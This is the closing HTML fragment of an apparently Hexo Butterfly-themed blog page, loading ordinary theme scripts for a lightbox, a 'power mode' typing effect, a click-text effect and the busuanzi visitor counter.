class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="true" data-text="I,LOVE,YOU" data-fontsize="15px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
